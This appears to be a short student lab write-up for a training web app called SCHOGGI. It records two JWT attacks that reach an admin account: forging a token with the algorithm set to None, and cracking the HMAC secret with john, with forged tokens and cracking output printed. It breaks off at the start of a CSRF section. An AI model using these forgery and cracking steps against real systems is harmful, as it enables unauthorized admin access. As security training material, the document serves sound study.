# SCHOGGI: JWT Vulnerability 1

- watched Request and Response of the `/api/account` via Burp Proxy
- used Repeater and changed JWT Algo to `None`
- by doing so we could iterate through the `uid` and `105` is an admin
- the signature is recalculated and replaced value inside the Storage in Firefox

```json
eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0.eyJqdGkiOiIxYTZkODhiZS0xMjFkLTQzYmEtODU1ZC1kMmZiZDgwNWY1OTYiLCJ1aWQiOjEwNSwiZXhwIjoxNzAzMDEwNDczfQ.
```

- after that we could access the profile page of the `admin victor`

# SCHOGGI: JWT Vulnerability 2

- watched Request and Response of the `/api/account` via Burp Proxy
- saved the JWT to a file and used `john` to get the _MAC Password_
- the result was that the _MAC Password_ is `pyramid`

```sh
> john --format=HMAC-SHA256 --wordlist=10-million-password-list-top-10000.txt lab08_challenge02_jwt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pyramid          (?)
1g 0:00:00:00 DONE (2023-12-20 07:00) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..lobo
```

- from there we used the _MAC Password_ and recalculated the JWT of the `uid=105` because we already know that this is an admin
- the signature is recalculated and replaced value inside the Storage in Firefox

```json
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIzMzcwNmFiMC0xNDg2LTQ4ZmYtOGE2Ni1kYzA4ODk0NmFhYjUiLCJ1aWQiOjEwNSwiZXhwIjoxNzAzMDU0MjUxfQ.4d7hSiOucVXb-yKkZjLUdtH_bm9Vim3wkaHdvo2bB9w
```

- after that we could access the admin page of the admin user `victor`

# SCHOGGI: Cross-Site Request Forgery (CSRF) with JSON

- watched Request and Response of the `/api/account` via Burp Proxy
